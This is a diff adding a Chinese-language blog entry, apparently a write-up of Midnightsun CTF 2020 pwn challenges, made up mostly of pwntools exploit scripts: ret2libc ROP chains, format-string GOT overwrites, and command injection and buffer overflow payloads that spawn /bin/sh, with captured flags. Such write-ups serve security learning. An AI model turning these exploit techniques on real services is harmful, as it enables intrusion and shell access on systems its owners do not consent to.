@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Midnightsun CTF 2020</title>
+      <link href="/2020/04/05/Midnightsun-CTF-2020/"/>
+      <url>/2020/04/05/Midnightsun-CTF-2020/</url>
+      
+        <content type="html"><![CDATA[<p>只会做简单的，re没去做，做pwn去了。</p><blockquote><p>pwn1</p></blockquote><pre><code class="python">offset = 0x48pop_rdi = 0x0000000000400783 # pop rdi ; retpop_rsi = 0x0000000000400781 # pop rsi ; pop r15 ; retmain = 0x0000000000400698puts_plt = elf.plt[&quot;puts&quot;]puts_got = elf.got[&quot;puts&quot;]puts_offset = libc.symbols[&quot;puts&quot;]system_offset = libc.symbols[&quot;system&quot;]str_bin_sh_offset = libc.search(&quot;/bin/sh&quot;).next()p.recvuntil(&quot;buffer: &quot;)payload = &quot;A&quot; * offsetpayload += flat([pop_rdi, puts_got, puts_plt, main])p.sendline(payload)libc_puts = u64(p.recv(6).ljust(8, &quot;\x00&quot;))libc_base = libc_puts - puts_offsetlibc_system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload = &quot;A&quot; * offsetpayload += flat([pop_rsi, 0, 0, pop_rdi, str_bin_sh, libc_system])p.sendline(payload)success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;libc_system: &quot; + hex(libc_system))success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))p.interactive()</code></pre><p><code>midnight{the_pwnshank_redemption_d2b4205bea4b8eeb}</code></p><blockquote><p>pwn2</p></blockquote><pre><code class="python">def format_str(offset, addr_value_pairs, size, info=&quot;&quot;):    payload = &quot;&quot;    length = 0    for item in addr_value_pairs:        for i in range(size):            payload += p32(item[0] + i)    length = len(payload)    for item in addr_value_pairs:        temp = item[1]        for i in range(size):            value = ((temp &amp; 0xFF) + 0x100 - length) &amp; 0xFF            if value == 0:                value = 0x100            payload += &quot;%&quot; + str(value) + &quot;c%&quot; + str(offset) + &quot;$hhn&quot;            length = temp &amp; 0xFF            temp &gt;&gt;= 8            offset += 1    payload += info    return payloadcontext.log_level = &quot;debug&quot;offset = 7_exit = elf.got[&quot;exit&quot;]target_addr = 0x08048672printf_got = elf.got[&quot;printf&quot;]main = 0x080485EB__libc_start_main_ret_offset = libc.symbols[&quot;__libc_start_main&quot;] + 241system_offset = libc.symbols[&quot;system&quot;]str_bin_sh_offset = libc.search(&quot;/bin/sh&quot;).next()payload = format_str(offset, [[_exit, main]], 2, &quot;addr:%27$p&quot;)p.sendlineafter(&quot;input: &quot;, payload)p.recvuntil(&quot;addr:0x&quot;)__libc_start_main_ret = int(p.recv(8), 16)libc_base = __libc_start_main_ret - __libc_start_main_ret_offsetlibc_system = libc_base + system_offsetpayload = format_str(offset, [[printf_got, libc_system]], 4)p.sendline(payload)payload = &quot;/bin/sh\x00&quot;p.sendlineafter(&quot;input: &quot;, payload)success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;libc_system: &quot; + hex(libc_system))p.interactive()</code></pre><p><code>midnight{the_pwnfather_0ff771d2eccc36b8}</code></p><blockquote><p>pwn4</p></blockquote><p>没做出来，知识盲区：</p><pre><code class="C">printf(&quot;%2$*25$d%16$n&quot;);</code></pre><p>输出第25个参数，并根据第2个参数宽度对齐。<br><br>没尝试打远程了，输出太长了，反正比赛结束了，直接打本地了。</p><pre><code class="python">from pwn import *# context.log_level = &quot;debug&quot;p = process(&quot;./pwn4&quot;)gdb.attach(p, &quot;b fprintf&quot;)payload = &quot;%2$*25$d%16$n&quot;p.sendline(payload)p.sendline(&quot;5536&quot;)p.interactive()</code></pre><blockquote><p>admpanel</p></blockquote><pre><code class="python">def auth(name, passwd):    p.sendlineafter(&quot; &gt; &quot;, &quot;1&quot;)    p.sendafter(&quot;  Input username: &quot;, name)    p.sendafter(&quot;  Input password: &quot;, passwd)def execute(comm):    p.sendlineafter(&quot; &gt; &quot;, &quot;2&quot;)    p.sendafter(&quot;  Command to execute: &quot;, comm)auth(&quot;admin\n&quot;, &quot;password\n&quot;)execute(&quot;id;/bin/sh\x00\n&quot;)p.interactive()</code></pre><p><code>midnight{n3v3r_4sk_b0bb_to_d0_S0m3TH4Ng}</code></p><blockquote><p>admpanel2</p></blockquote><pre><code class="python">context.log_level = &#39;debug&#39;def auth(name, passwd):    p.sendlineafter(&quot; &gt; &quot;, &quot;1&quot;)    p.sendafter(&quot;  Input username: &quot;, name)    p.sendafter(&quot;  Input password: &quot;, passwd)def execute(comm):    p.sendlineafter(&quot; &gt; &quot;, &quot;2&quot;)    p.sendafter(&quot;  Command to execute: &quot;, comm)target_addr = 0x0000000000401598name = &quot;admin;/bin/sh;&quot;.ljust(0x3FE, &quot;A&quot;) + &#39;\n&#39;auth(name, &quot;password\n&quot;)comm = &quot;B&quot; * 0x10c + p64(target_addr) + &quot;\n&quot;execute(comm)p.interactive()#flag: midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}</code></pre><p><code>midnight{n3ver_4sk_hsp3_t0_do_s0m3th1ng}</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Writeup </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>VolgaCTF 2020</title>
       <link href="/2020/03/31/VolgaCTF-2020/"/>
       <url>/2020/03/31/VolgaCTF-2020/</url>
